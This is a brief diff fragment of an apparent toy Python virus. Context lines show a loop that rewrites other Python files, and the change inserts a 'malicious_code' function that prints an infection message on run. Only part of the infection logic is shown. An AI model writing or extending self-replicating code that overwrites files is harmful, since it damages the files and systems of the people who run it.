@@ -43,6 +43,10 @@ for file in python_files:
         with open(file, 'w') as f:
             f.writelines(final_code)
 
+def malicious_code():
+    print("YOU HAVE BEEN INFECTED HAHAHA !!!")
+
+malicious_code()
 
 # VIRUS SAYS BYE!
 
